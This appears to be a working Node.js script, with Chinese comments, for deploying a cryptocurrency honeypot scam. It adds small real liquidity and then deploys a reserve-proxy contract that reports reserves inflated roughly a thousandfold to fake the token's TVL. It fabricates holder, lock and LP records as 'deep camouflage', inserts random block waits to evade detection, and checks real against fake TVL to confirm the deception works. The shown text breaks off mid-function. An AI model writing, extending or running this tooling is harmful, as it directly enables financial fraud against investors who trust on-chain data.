// addLiquidity.js - v15.4.2-focused-liquidity with full camouflage and factory contract
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { ethers, Contract } from "ethers";
import solc from "solc";
import { initRpcManager, getRpcProvider } from "../config/rpcManager.js";
import dotenv from "dotenv";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 引入深度伪装模块
import { EnhancedHoldersCamouflage } from './camouflage/EnhancedHoldersCamouflage.js';
import { EnhancedLockerCamouflage } from './camouflage/EnhancedLockerCamouflage.js';
import { EnhancedLPCamouflage } from './camouflage/EnhancedLPCamouflage.js';
import { EnhancedFormatCamouflage } from './camouflage/EnhancedFormatCamouflage.js';

// 新增：交易确认超时配置
const CONFIRMATION_TIMEOUT = 15000;
const CONFIRMATION_RETRY_DELAY = 5000;
const CONFIRMATION_MAX_ATTEMPTS = 5;

function replacer(key, value) {
  return typeof value === 'bigint' ? value.toString() : value;
}

// 网络到代币符号映射
const tokenSymbols = {
  bsc: "BNB",
  bsc_testnet: "BNB",
  polygon: "MATIC",
  ethereum: "ETH",
  arbitrum: "ETH",
  optimism: "ETH",
  avax: "AVAX",
  fantom: "FTM",
  base: "ETH",
  sepolia: "ETH"
};

// 网络到CoinGecko代币ID映射
const coingeckoIds = {
  bsc: "binancecoin",
  bsc_testnet: "binancecoin",
  polygon: "matic-network",
  ethereum: "ethereum",
  arbitrum: "ethereum",
  optimism: "ethereum",
  avax: "avalanche-2",
  fantom: "fantom",
  base: "ethereum",
  sepolia: "ethereum"
};

// ---------- 路径修正部分 ----------
function getBaseDirs(userId, network, deployId) {
  const deployBase = path.join(__dirname, `../deployments/${userId}/${network}/${deployId}`);
  const walletBase = path.join(__dirname, `../wallets/${userId}/${deployId}`);
  const envPath = path.join(__dirname, `../configs/${userId}/.env`);
  return { deployBase, walletBase, envPath };
}

function loadABI(deployBase, contractName) {
  const abiPath = path.join(deployBase, `abis/${contractName}_ABI.json`);
  if (!fs.existsSync(abiPath)) throw new Error(`找不到ABI文件: ${abiPath}`);
  return JSON.parse(fs.readFileSync(abiPath, "utf8"));
}

function loadMeta(deployBase) {
  const metaPath = path.join(deployBase, ".meta.json");
  if (!fs.existsSync(metaPath)) throw new Error(`找不到meta文件: ${metaPath}`);
  const meta = JSON.parse(fs.readFileSync(metaPath, "utf8"));
  return { meta, metaPath };
}

function loadDeployerWallet(walletBase) {
  const filePath = path.join(walletBase, "deployers.json");
  if (!fs.existsSync(filePath)) throw new Error(`找不到钱包文件: ${filePath}`);
  const wallets = JSON.parse(fs.readFileSync(filePath, "utf8"));
  // 最新创建的 admin
  const adminWallet = wallets.filter(w => w.role === "admin")
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
  if (!adminWallet) throw new Error("❌ 找不到 adminWallet");
  return adminWallet;
}

// Pair合约ABI
function getPairAbi() {
  return [
    "function sync() external",
    "function getReserves() external view returns (uint112, uint112, uint32)",
    "function token0() external view returns (address)",
    "function token1() external view returns (address)",
    "function balanceOf(address) external view returns (uint)",
    "function totalSupply() external view returns (uint)",
    "function factory() external view returns (address)",
    "function kLast() external view returns (uint256)"
  ];
}

// 获取实时代币价格（修复版本）
async function getRealTimeTokenPrice(coinId) {
  try {
    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`, {
      timeout: 5000
    }).catch(() => { throw new Error("API请求超时"); });
    
    if (!response.ok) {
      throw new Error(`API响应错误: ${response.status}`);
    }
    
    const data = await response.json();
    if (!data[coinId] || !data[coinId].usd) {
      throw new Error("无效的API响应格式");
    }
    
    return data[coinId].usd;
  } catch (error) {
    console.error(`❌ 获取${coinId.toUpperCase()}价格失败:`, error.message);
    
    // 提供常见代币的默认价格
    const defaultPrices = {
      ethereum: 4000,
      binancecoin: 600,
      "matic-network": 0.7,
      "avalanche-2": 35,
      fantom: 0.3
    };
    
    const defaultPrice = defaultPrices[coinId] || 4000;
    console.log(`⚠️ 使用默认价格$${defaultPrice}作为备用`);
    return defaultPrice;
  }
}

// 修复后的编译合约函数
async function compileContract(sourceCode, contractName = "ReserveProxy") {
  try {
    const input = {
      language: 'Solidity',
      sources: {
        'Contract.sol': {
          content: sourceCode
        }
      },
      settings: {
        outputSelection: {
          '*': {
            '*': ['*']
          }
        }
      }
    };
    
    const output = JSON.parse(solc.compile(JSON.stringify(input)));
    
    if (output.errors) {
      const errors = output.errors.filter(e => e.severity === 'error');
      if (errors.length > 0) {
        throw new Error(`编译错误: ${errors.map(e => e.formattedMessage).join('\n')}`);
      }
    }
    
    // 检查合约是否存在
    if (!output.contracts || !output.contracts['Contract.sol'] || !output.contracts['Contract.sol'][contractName]) {
      console.error("可用合约:", Object.keys(output.contracts?.['Contract.sol'] || {}));
      throw new Error(`找不到合约: ${contractName}`);
    }
    
    const contract = output.contracts['Contract.sol'][contractName];
    return [
      contract.abi,
      contract.evm.bytecode.object
    ];
  } catch (err) {
    console.error('❌ 合约编译失败:', err.message);
    throw err;
  }
}

// 等待新区块
async function waitForNewBlock(provider, currentBlock) {
  let newBlock = currentBlock;
  while (newBlock <= currentBlock) {
    await new Promise(resolve => setTimeout(resolve, 3000));
    newBlock = await provider.getBlockNumber();
    console.log(`▹ 当前区块: ${newBlock}`);
  }
  return newBlock;
}

// 增强的交易确认机制
async function waitForTransactionConfirmation(provider, txHash, label = "交易") {
  let confirmationAttempts = 0;
  
  while (confirmationAttempts < CONFIRMATION_MAX_ATTEMPTS) {
    confirmationAttempts++;
    
    try {
      // 设置确认超时
      const receipt = await Promise.race([
        provider.waitForTransaction(txHash, 1),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('交易确认超时')), CONFIRMATION_TIMEOUT)
        )
      ]);
      
      if (receipt && receipt.status === 1) {
        console.log(`✅ ${label}已确认 (区块 ${receipt.blockNumber})`);
        return receipt;
      } else if (receipt && receipt.status === 0) {
        throw new Error(`${label}失败: 交易被拒绝`);
      }
    } catch (waitError) {
      if (waitError.message === '交易确认超时') {
        console.warn(`⏰ ${label}等待确认超时 (尝试 ${confirmationAttempts}/${CONFIRMATION_MAX_ATTEMPTS})`);
        
        if (confirmationAttempts >= CONFIRMATION_MAX_ATTEMPTS) {
          // 最终尝试：直接查询链上状态
          try {
            console.log(`🔍 最终尝试：直接查询链上交易状态...`);
            const finalReceipt = await provider.getTransactionReceipt(txHash);
            if (finalReceipt && finalReceipt.confirmations >= 1) {
              console.log(`✅ ${label}已确认 (区块 ${finalReceipt.blockNumber}) [通过直接查询获得]`);
              return finalReceipt;
            }
            
            console.error(`❌ 交易 ${txHash.slice(0, 10)}... 在链上找不到确认信息`);
            throw new Error(`${label}确认失败: 在链上找不到交易确认信息`);
          } catch (queryError) {
            console.error(`❌ 最终查询也失败: ${queryError.message}`);
            throw new Error(`${label}确认过程完全失败: ${queryError.message}`);
          }
        }
        
        // 等待一段时间后重试
        await new Promise((r) => setTimeout(r, CONFIRMATION_RETRY_DELAY));
        continue;
      }
      
      // 其他错误直接抛出
      throw waitError;
    }
  }
  
  throw new Error(`❌ ${label}多次确认尝试失败`);
}

// 修复后的带重试的合约部署函数
async function deployContractWithRetry(factory, args, signer, label) {
  for (let i = 0; i < 3; i++) {
    try {
      console.log(`🚀 部署${label}合约 (尝试 ${i + 1}/3)...`);
      const contract = await factory.deploy(...args);
      const deploymentTx = contract.deploymentTransaction();
      
      if (!deploymentTx) {
        throw new Error("部署交易未创建");
      }
      
      const txHash = deploymentTx.hash;
      console.log(`📤 ${label}合约部署交易已发送: ${txHash}`);
      
      // 使用增强的确认机制等待部署确认
      await waitForTransactionConfirmation(signer.provider, txHash, `${label}部署`);
      
      // 等待合约部署完成
      await contract.waitForDeployment();
      const address = await contract.getAddress();
      
      console.log(`✅ ${label}合约部署成功: ${address}`);
      return contract;
    } catch (e) {
      console.warn(`⚠️ ${label}合约部署失败 (${i + 1}/3):`, e.message);
      if (i >= 2) throw e;
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
  throw new Error(`❌ ${label}合约部署多次尝试失败`);
}

// 验证蜜罐效果
async function verifyHoneypotEffect(provider, tokenAddress, reserveProxyAddress, tokenContract, decimals, symbol, tokenPrice, lpToken) {
  try {
    console.log("\n🔍 验证蜜罐效果...");
    
    // 直接使用已知的LP地址
    const realPair = lpToken;
    
    console.log(`🔍 真实LP地址: ${realPair}`);
    console.log(`🔍 储备代理地址: ${reserveProxyAddress}`);
    
    // 1. 直接查询真实LP对
    const realPairContract = new ethers.Contract(realPair, getPairAbi(), provider);
    const [realReserve0, realReserve1] = await realPairContract.getReserves();
    
    // 2. 通过代币合约查询（应该返回代理数据）
    const [proxyReserve0, proxyReserve1] = await tokenContract.getReserves();
    
    // 3. 直接查询储备代理
    const reserveProxyContract = new ethers.Contract(reserveProxyAddress, getPairAbi(), provider);
    const [directReserve0, directReserve1] = await reserveProxyContract.getReserves();
    
    console.log("\n📊 储备数据对比:");
    console.log(`真实储备: ${ethers.formatUnits(realReserve0, decimals)} 代币, ${ethers.formatEther(realReserve1)} ${symbol}`);
    console.log(`代理储备: ${ethers.formatUnits(proxyReserve0, decimals)} 代币, ${ethers.formatEther(proxyReserve1)} ${symbol}`);
    console.log(`直接查询代理: ${ethers.formatUnits(directReserve0, decimals)} 代币, ${ethers.formatEther(directReserve1)} ${symbol}`);
    
    // 计算TVL
    const realEthValue = parseFloat(ethers.formatEther(realReserve1)) * tokenPrice;
    const proxyEthValue = parseFloat(ethers.formatEther(proxyReserve1)) * tokenPrice;
    
    const realTVL = (realEthValue * 2).toLocaleString('en-US', {
      style: 'currency',
      currency: 'USD'
    });
    
    const fakeTVL = (proxyEthValue * 2).toLocaleString('en-US', {
      style: 'currency',
      currency: 'USD'
    });
    
    console.log(`\n💰 TVL对比:`);
    console.log(`真实TVL: ${realTVL}`);
    console.log(`虚假TVL: ${fakeTVL}`);
    
    // 检查一致性
    const tokenConsistent = proxyReserve0.toString() === directReserve0.toString();
    const ethConsistent = proxyReserve1.toString() === directReserve1.toString();
    
    console.log(`\n✅ 代币储备一致性: ${tokenConsistent ? "匹配" : "不匹配"}`);
    console.log(`✅ ${symbol}储备一致性: ${ethConsistent ? "匹配" : "不匹配"}`);
    
    return {
      success: tokenConsistent && ethConsistent,
      realTVL: realTVL,
      fakeTVL: fakeTVL,
      amplification: Math.round(proxyEthValue / realEthValue)
    };
  } catch (error) {
    console.error("❌ 验证蜜罐效果时出错:", error.message);
    return { success: false, error: error.message };
  }
}

// ---------- 新增：深度伪装功能 ----------
// 深度伪装执行流程
async function executeDeepCamouflage(provider, tokenContract, adminWallet, adminContract, tokenAddress, lpTokenAddress, reserveProxyAddress, deployBase, factoryContract) {
  console.log("🎭 执行深度链上伪装...");
  
  try {
    // 1. 持币分布深度伪装
    const holdersCamouflage = new EnhancedHoldersCamouflage(
      provider, 
      tokenContract, 
      adminWallet, 
      adminContract,
      tokenAddress,
      factoryContract // 确保传递工厂合约实例
    );
    
    // 设置小数位数
    try {
      holdersCamouflage.decimals = await tokenContract.decimals();
    } catch (e) {
      console.warn(`⚠️ 无法获取代币精度，使用默认值18: ${e.message}`);
      holdersCamouflage.decimals = 18;
    }
    
    const holders = await holdersCamouflage.createDeepHoldersDistribution(100);
    const totalSupply = await tokenContract.totalSupply();
    const holdersAnalysis = holdersCamouflage.generateHoldersAnalysis(holders, totalSupply);
    
    // 2. 锁仓深度伪装
    const lockerCamouflage = new EnhancedLockerCamouflage(provider, tokenContract, adminWallet);
    const locks = await lockerCamouflage.createDeepLockingRecords();
    const timelocks = await lockerCamouflage.createTimelockRecords();
    
    // 3. LP持有深度伪装
    const lpCamouflage = new EnhancedLPCamouflage(provider, lpTokenAddress, reserveProxyAddress);
    const lpDistribution = await lpCamouflage.generateLPHoldersDistribution(totalSupply);
    const lpAnalysis = await lpCamouflage.generateLPAnalysis();
    
    // 4. 格式深度伪装
    const formatCamouflage = new EnhancedFormatCamouflage();
    const formattedReport = await formatCamouflage.createDeepFormatCamouflage(
      holders, 
      [...locks, ...timelocks], 
      lpDistribution
    );
    
    // 保存完整报告
    const fullReport = {
      ...formattedReport,
      rawData: {
        holders,
        locks: [...locks, ...timelocks],
        lpDistribution
      },
      analytics: {
        holders: holdersAnalysis,
        liquidity: lpAnalysis
      },
      generatedAt: new Date().toISOString(),
      strategyVersion: "3.0-deep"
    };
    
    fs.writeFileSync(
      path.join(deployBase, "deep_camouflage_report.json"),
      JSON.stringify(fullReport, null, 2)
    );
    
    console.log("🎉 深度链上伪装完成！");
    console.log("📊 生成的深度分析报告已保存");
    
    return fullReport;
  } catch (error) {
    console.error("❌ 深度伪装执行失败:", error.message);
    return null;
  }
}

// 地址格式校验和修复函数
function ensureChecksumAddress(address) {
  try {
    return ethers.getAddress(address);
  } catch (error) {
    console.warn(`⚠️ 地址格式错误: ${address}, 尝试修复...`);
    // 尝试修复地址格式
    const cleanAddress = address.trim().toLowerCase();
    try {
      return ethers.getAddress(cleanAddress);
    } catch (fixError) {
      console.error(`❌ 无法修复地址格式: ${address}`);
      throw new Error(`无效的以太坊地址: ${address}`);
    }
  }
}

// 批量处理地址校验和
function ensureChecksumAddresses(addresses) {
  return addresses.map(addr => {
    try {
      return ethers.getAddress(addr);
    } catch (error) {
      console.warn(`⚠️ 地址格式错误: ${addr}, 尝试修复...`);
      // 尝试修复地址格式
      const cleanAddress = addr.trim().toLowerCase();
      try {
        return ethers.getAddress(cleanAddress);
      } catch (fixError) {
        console.error(`❌ 无法修复地址格式: ${addr}`);
        throw new Error(`无效的以太坊地址: ${addr}`);
      }
    }
  });
}

// ---------- 主流程 ----------
async function main() {
  // 参数：[userId] [network] [deployId]
  const userId = process.argv[2];
  const network = process.argv[3];
  const deployId = process.argv[4];

  if (!userId || !network || !deployId)
    throw new Error("❌ 用法: node scripts/addLiquidity.js <userId> <network> <deployId>");

  // 初始化RPC管理器
  try {
    initRpcManager(userId);
    console.log('✅ RPC管理器初始化成功');
  } catch (error) {
    console.error('❌ RPC管理器初始化失败:', error.message);
    process.exit(1);
  }

  // 获取当前网络的代币符号和CoinGecko ID
  const symbol = tokenSymbols[network] || "ETH";
  const coinId = coingeckoIds[network] || "ethereum";

  // 打印格式化的用户信息
  console.log("══════════════════════════════════════════════");
  console.log(`[用户ID]         : ${userId}`);
  console.log(`[网络]           : ${network} (${symbol})`);
  console.log(`[部署ID]         : ${deployId}`);
  console.log("══════════════════════════════════════════════");

  // 加载专属env
  const { deployBase, walletBase, envPath } = getBaseDirs(userId, network, deployId);
  if (!fs.existsSync(envPath)) throw new Error(`❌ 用户env文件不存在: ${envPath}`);
  dotenv.config({ path: envPath, override: true });

  // 读取核心文件
  const { meta, metaPath } = loadMeta(deployBase);
  const adminWallet = loadDeployerWallet(walletBase);

  // 确保所有地址都使用正确的校验和格式
  const tokenAddress = ensureChecksumAddress(meta.proxyAddress || meta.proxy);
  const logicAddress = ensureChecksumAddress(meta.logicAddress || meta.logic);
  const adminAddress = ensureChecksumAddress(meta.adminAddress || meta.admin);
  
  // 修复DEX配置导入 - 使用绝对路径
  let getDexConfig;
  try {
    // 尝试从相对路径导入
    const dexConfigModule = await import('../config/dexConfig.js');
    getDexConfig = dexConfigModule.getDexConfig;
  } catch (error) {
    console.error('❌ 无法加载dexConfig.js:', error.message);
    throw new Error('请确保dexConfig.js文件存在且路径正确');
  }
  
  const dexConfig = getDexConfig(network);
  const blockExplorer = meta.blockExplorerUrl || dexConfig.explorer;
  const router = ensureChecksumAddress(meta.router || dexConfig.router);
  const weth = ensureChecksumAddress(meta.wethAddress || dexConfig.weth);
  const factoryAddress = ensureChecksumAddress(dexConfig.factory);

  // 检查工厂地址是否正确
  if (!factoryAddress || factoryAddress === "0x0000000000000000000000000000000000000000") {
    throw new Error(`❌ 获取到无效的工厂地址: ${factoryAddress}`);
  }

  // 伪造流动性配置
  const tokenAmount = process.env.LIQUIDITY_TOKEN_AMOUNT || "1000000";
  const ethAmount = process.env.LIQUIDITY_ETH_AMOUNT ? ethers.parseEther(process.env.LIQUIDITY_ETH_AMOUNT) : ethers.parseEther("0.1");
  const honeypotMode = process.env.HONEYPOT_MODE === "true";
  const deepCamouflage = process.env.DEEP_CAMOUFLAGE === "true";

  console.log("\n=== 添加伪造流动性（蜜罐模式） ===");
  console.log(`📁 部署目录: ${deployBase}`);
  console.log(`📁 钱包目录: ${walletBase}`);
  console.log(`📁 env文件:  ${envPath}`);
  console.log(`🪙 伪造代币数量: ${tokenAmount}`);
  console.log(`💧 实际${symbol}注入: ${ethers.formatEther(ethAmount)}`);
  console.log(`🏭 工厂地址: ${factoryAddress}`);
  
  if (honeypotMode) {
    console.log("\n🔥 蜜罐模式已启用");
  }
  
  if (deepCamouflage) {
    console.log("\n🎭 深度伪装模式已启用");
  }

  const provider = getRpcProvider(network);
  console.log(`🌐 成功连接到 RPC: ${provider.connection?.url || provider.connection?.endpoint || "自定义"}`);
  const signer = new ethers.Wallet(adminWallet.privateKey, provider);

  // 加载ABI
  const LOGIC_ABI = loadABI(deployBase, "Logic");
  console.log("✅ Logic ABI加载成功");

  // 使用代理合约地址作为代币合约地址
  const tokenContract = new Contract(tokenAddress, LOGIC_ABI, signer);

  let decimals = 18;
  try { 
    decimals = await tokenContract.decimals(); 
    console.log(`✅ 代币精度: ${decimals}`);
  } catch(e) {
    console.warn(`⚠️ 无法获取代币精度，使用默认值18: ${e.message}`);
  }

  // 检查代理合约的代币余额
  const [ethBalance, tokenBalance, allowance] = await Promise.all([
    provider.getBalance(adminWallet.address),
    tokenContract.balanceOf(tokenAddress),  // 代理合约自身的余额
    tokenContract.allowance(tokenAddress, router)  // 代理合约对路由器的授权
  ]);

  const mintAmount = ethers.parseUnits(tokenAmount, decimals);
  
  // 移除滑点保护
  const minToken = 0;
  const minETH = 0;
  
  const deadline = Math.floor(Date.now() / 1000) + 1800;

  console.log(`\n🔑 Admin钱包地址: ${adminWallet.address}`);
  console.log(`🔹 Admin合约地址: ${adminAddress}`);
  console.log(`🔹 Token地址 (Proxy): ${tokenAddress}`);
  console.log(`💰 Admin钱包${symbol}余额: ${ethers.formatEther(ethBalance)}`);
  console.log(`💎 代理合约Token余额: ${ethers.formatUnits(tokenBalance, decimals)}`);
  console.log(`🪙 代理合约对路由器的授权额度: ${ethers.formatUnits(allowance, decimals)}`);

  // 如果授权不足，需要先授权
  if (allowance < mintAmount) {
    console.log("⏳ 授权路由器使用代理合约的代币...");
    
    // 通过Admin合约调用代理合约的approve方法
    const ADMIN_ABI = loadABI(deployBase, "Admin");
    const adminContractInstance = new ethers.Contract(adminAddress, ADMIN_ABI, signer);
    
    const approveData = tokenContract.interface.encodeFunctionData(
      "approve",
      [router, mintAmount]
    );
    
    const approveTx = await adminContractInstance.executeCall(
      tokenAddress,
      0,
      approveData
    );
    
    await waitForTransactionConfirmation(provider, approveTx.hash, "授权");
    console.log("✅ 授权完成");
  }

  const feeData = await provider.getFeeData();
  const overrides = {
    value: ethAmount,
    gasLimit: 5_000_000,
    maxFeePerGas: feeData.maxFeePerGas ? feeData.maxFeePerGas * 2n : undefined,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? feeData.maxPriorityFeePerGas * 2n : undefined
  };

  console.log(`\n💧 伪造流动性参数:`);
  console.log(JSON.stringify({
    tokenAmount: mintAmount.toString(),
    ethAmount: ethAmount.toString(),
    minToken: minToken.toString(),
    minETH: minETH.toString(),
    to: tokenAddress,
    deadline,
    ...overrides
  }, replacer, 2));

  try {
    console.log("\n⏳ 发送添加流动性交易...");

    // 加载Admin ABI
    const ADMIN_ABI = loadABI(deployBase, "Admin");
    const adminContractInstance = new ethers.Contract(adminAddress, ADMIN_ABI, signer);

    // 直接调用Admin合约的addLiquidityETH函数
    const tx = await adminContractInstance.addLiquidityETH(
      mintAmount, 
      minToken, 
      minETH, 
      adminWallet.address, 
      deadline,
      overrides
    );

    console.log(`\n⛓️ 交易已发送: ${blockExplorer}/tx/${tx.hash}`);
    
    // 使用增强的确认机制等待交易确认
    const receipt = await waitForTransactionConfirmation(provider, tx.hash, "添加流动性");
    
    if (receipt.status === 0) throw new Error("交易失败");

    console.log(`✅ 添加成功，区块号: ${receipt.blockNumber}`);

    const routerContract2 = new ethers.Contract(router, ["function factory() external view returns (address)"], provider);
    const factoryAddr = await routerContract2.factory();
    const factoryContract = new ethers.Contract(factoryAddr, ["function getPair(address, address) external view returns (address)"], provider);
    const lpToken = await factoryContract.getPair(tokenAddress, weth);

    if (!lpToken || lpToken === ethers.ZeroAddress) {
      console.warn("⚠️ 未能获取 LP 地址");
    } else {
      const checksummedLpToken = ensureChecksumAddress(lpToken);
      console.log(`✅ LP 交易对地址: ${checksummedLpToken}`);
      meta.lpToken = checksummedLpToken;
      meta.lpAddress = checksummedLpToken;
      fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2));
      console.log(`📁 已写入 meta.json: lpToken / lpAddress`);
    }
    
    // 获取实时代币价格
    console.log(`\n🔍 获取实时${symbol}价格...`);
    const tokenPrice = await getRealTimeTokenPrice(coinId);
    console.log(`✅ 当前${symbol}价格: $${tokenPrice}`);
    
    // 蜜罐模式部署
    if (honeypotMode && lpToken && lpToken !== ethers.ZeroAddress) {
      console.log("\n🔥 正在部署蜜罐代理合约...");
      
      // 加载代理合约模板
      const { generateReserveProxyTemplate } = await import("../builder/ReserveProxyTemplate.js");
      const proxySource = generateReserveProxyTemplate("0.8.0", network, factoryAddress);
      
      // 代币使用固定倍数，主币使用动态倍数 (±10%)
      const baseMultiplier = parseInt(process.env.HONEYPOT_MULTIPLIER || "1000");
      const tokenMultiplier = baseMultiplier; // 代币固定倍数
      const ethVariation = Math.floor(Math.random() * 200) - 100; // -100 到 +100，即 ±10%
      const ethMultiplier = baseMultiplier + ethVariation; // 主币动态倍数
      
      console.log(`🎯 代币固定倍数: ${tokenMultiplier}x`);
      console.log(`🎯 主币动态倍数: ${ethMultiplier}x (基础${baseMultiplier}x ±${ethVariation})`);
      
      try {
        // 编译合约
        console.log("🛠️ 编译储备代理合约...");
        const [proxyAbi, proxyBytecode] = await compileContract(proxySource, "ReserveProxy");
        console.log("✅ 合约编译成功");
        
        // 部署储备代理合约
        const ReserveProxyFactory = new ethers.ContractFactory(
          proxyAbi, 
          proxyBytecode, 
          signer
        );
        
        // 使用带重试的部署函数
        const reserveProxy = await deployContractWithRetry(
          ReserveProxyFactory,
          [
            lpToken,           // 真实LP地址
            tokenMultiplier,   // 代币固定倍数
            ethMultiplier,     // 主币动态倍数
            tokenAddress,      // 代币合约地址
            weth               // WETH地址
          ],
          signer,
          "储备代理"
        );
        
        const reserveProxyAddress = await reserveProxy.getAddress();
        console.log(`🛡️ 储备代理合约地址: ${reserveProxyAddress}`);
        
        // 关键修复：给Admin合约转账以确保有足够Gas费
        console.log("💸 给Admin合约转账以确保有足够Gas费...");
        const transferTx = await signer.sendTransaction({
            to: adminAddress,
            value: ethers.parseEther("0.05") // 转账0.05 ETH/BNB
        });
        
        // 使用增强的确认机制等待转账确认
        await waitForTransactionConfirmation(provider, transferTx.hash, "Admin转账");
        console.log("✅ 已向Admin合约转账0.05", symbol);
        
        // 更新meta文件
        meta.reserveProxy = reserveProxyAddress;
        meta.honeypotTokenMultiplier = tokenMultiplier.toString();
        meta.honeypotEthMultiplier = ethMultiplier.toString();
        // 添加Admin合约余额信息
        meta.adminBalance = ethers.formatEther(await provider.getBalance(adminAddress));
        fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2));
        console.log("📁 更新meta.json: 添加reserveProxy和倍数参数");
        
        // 关键修复：确保Admin合约有权限
        console.log("🔑 授予Admin合约权限...");
        try {
          const grantAdminData = tokenContract.interface.encodeFunctionData(
            "setAdmin", 
            [adminAddress, true]
          );
          
          const grantTx = await adminContractInstance.executeCall(
            tokenAddress,
            0,
            grantAdminData
          );
          
          // 使用增强的确认机制等待权限授予确认
          await waitForTransactionConfirmation(provider, grantTx.hash, "权限授予");
          console.log("✅ Admin合约权限已授予");
        } catch (grantError) {
          console.error("❌ 授予Admin合约权限失败:", grantError.message);
        }
        
        // 在设置代理前等待新区块
        console.log("⏳ 等待新区块以避免重入保护...");
        let currentBlock = await provider.getBlockNumber();
        currentBlock = await waitForNewBlock(provider, currentBlock);
        
        // 通过Admin合约配置Logic合约使用代理
        console.log("🔗 通过Admin合约配置Logic合约使用代理...");
        try {
          // 首先设置储备代理
          const setReserveProxyData = tokenContract.interface.encodeFunctionData(
            "setReserveProxy", 
            [reserveProxyAddress]
          );
          
          const setTx = await adminContractInstance.executeCall(
            tokenAddress,
            0,
            setReserveProxyData
          );
          
          // 使用增强的确认机制等待设置确认
          const setReceipt = await waitForTransactionConfirmation(provider, setTx.hash, "设置储备代理");
          console.log(`⛓️ 设置储备代理交易: ${blockExplorer}/tx/${setReceipt.hash}`);
          
          // 然后刷新LP地址缓存
          const refreshData = tokenContract.interface.encodeFunctionData(
            "refreshPairAddress", 
            []
          );
          
          const refreshTx = await adminContractInstance.executeCall(
            tokenAddress,
            0,
            refreshData
          );
          
          // 使用增强的确认机制等待刷新确认
          await waitForTransactionConfirmation(provider, refreshTx.hash, "刷新LP缓存");
          console.log("✅ 储备代理设置和LP缓存刷新完成");
        } catch (setError) {
          console.error("❌ 设置储备代理失败:", setError.message);
          throw setError;
        }
        
        // 部署持币者工厂合约
        console.log("🔄 部署持币者工厂合约...");
        try {
          const { generateHolderProxyFactoryTemplate } = await import("../builder/HolderProxyFactoryTemplate.js");
          const factoryTemplate = generateHolderProxyFactoryTemplate("0.8.0");
          const [factoryAbi, factoryBytecode] = await compileContract(factoryTemplate, "HolderProxyFactory");
          
          const HolderProxyFactory = new ethers.ContractFactory(
            factoryAbi,
            factoryBytecode,
            signer
          );
          
          const factoryContract = await deployContractWithRetry(
            HolderProxyFactory,
            [tokenAddress, adminAddress], // 参数: token地址, admin地址
            signer,
            "持币者工厂"
          );
          
          const factoryAddress = await factoryContract.getAddress();
          // 确保使用校验和地址
          const checksummedFactoryAddress = ensureChecksumAddress(factoryAddress);
          console.log(`✅ 持币者工厂合约部署成功: ${checksummedFactoryAddress}`);
          
          // 保存工厂合约ABI
          const factoryAbiPath = path.join(deployBase, "abis/HolderProxyFactory_ABI.json");
          fs.writeFileSync(factoryAbiPath, JSON.stringify(factoryAbi, null, 2));
          
          // 将工厂合约地址保存到meta，使用校验和地址
          meta.holderFactory = checksummedFactoryAddress;
          fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2));
        } catch (error) {
          console.error("❌ 工厂合约部署失败:", error.message);
          // 不中断流程，继续执行
        }
        
        // 抗检测：随机等待1-5个区块
        const waitBlocks = Math.floor(Math.random() * 5) + 1;
        console.log(`⏳ 随机等待${waitBlocks}个区块抗检测...`);
        for (let i = 0; i < waitBlocks; i++) {
          const block = await provider.getBlockNumber();
          console.log(`▹ 当前区块: ${block}`);
          await new Promise(resolve => setTimeout(resolve, 3000));
        }
        
        // 验证蜜罐效果
        const verificationResult = await verifyHoneypotEffect(
          provider,
          tokenAddress,
          reserveProxyAddress,
          tokenContract,
          decimals,
          symbol,
          tokenPrice,
          lpToken  // 添加lpToken参数
        );
        
        if (verificationResult.success) {
          console.log(`\n🎉 蜜罐部署成功! 放大倍数: ${verificationResult.amplification}x`);
          console.log(`📊 真实TVL: ${verificationResult.realTVL}`);
          console.log(`📊 虚假TVL: ${verificationResult.fakeTVL}`);
        } else {
          console.warn("⚠️ 蜜罐验证未完全成功，但部署已完成");
          if (verificationResult.error) {
            console.warn(`错误详情: ${verificationResult.error}`);
          }
        }
      } catch (compileErr) {
        console.error("❌ 蜜罐代理部署失败:", compileErr.message);
        console.log("⚠️ 跳过蜜罐代理部署，流动性添加成功");
      }
    }
    
    // 执行深度链上伪装流程
    if (deepCamouflage && lpToken && lpToken !== ethers.ZeroAddress) {
      let reserveProxyAddress = meta.reserveProxy;
      if (!reserveProxyAddress && honeypotMode) {
        console.warn("⚠️ 未找到储备代理地址，深度伪装可能需要储备代理");
        reserveProxyAddress = ethers.ZeroAddress; // 使用零地址作为备用
      }
      
      // 获取工厂合约实例
      let factoryContractInstance = null;
      if (meta.holderFactory) {
        try {
          // 确保地址使用正确的校验和格式
          const formattedFactoryAddress = ensureChecksumAddress(meta.holderFactory);
          const factoryAbi = JSON.parse(fs.readFileSync(path.join(deployBase, "abis/HolderProxyFactory_ABI.json"), "utf8"));
          factoryContractInstance = new ethers.Contract(formattedFactoryAddress, factoryAbi, signer);
          console.log(`✅ 工厂合约实例创建成功: ${formattedFactoryAddress}`);
        } catch (error) {
          console.error("❌ 加载工厂合约失败:", error.message);
          // 如果地址格式有问题，尝试修复
          if (error.code === 'INVALID_ARGUMENT' && error.argument === 'address') {
            console.log("⚠️ 尝试修复地址格式...");
            try {
              // 移除可能存在的空格或特殊字符
              const cleanAddress = meta.holderFactory.trim().toLowerCase();
              const formattedAddress = ensureChecksumAddress(cleanAddress);
              console.log(`🔧 修复后的地址: ${formattedAddress}`);
              
              // 重新创建合约实例
              const factoryAbi = JSON.parse(fs.readFileSync(path.join(deployBase, "abis/HolderProxyFactory_ABI.json"), "utf8"));
              factoryContractInstance = new ethers.Contract(formattedAddress, factoryAbi, signer);
              
              // 更新meta中的地址
              meta.holderFactory = formattedAddress;
              fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2));
              console.log("✅ 地址格式已修复并更新");
            } catch (fixError) {
              console.error("❌ 无法修复地址格式:", fixError.message);
            }
          }
        }
      }
      
      await executeDeepCamouflage(
        provider,
        tokenContract,
        adminWallet,
        adminContractInstance,
        tokenAddress,
        lpToken,
        reserveProxyAddress,
        deployBase,
        factoryContractInstance // 新增工厂合约实例
      );
    }
    
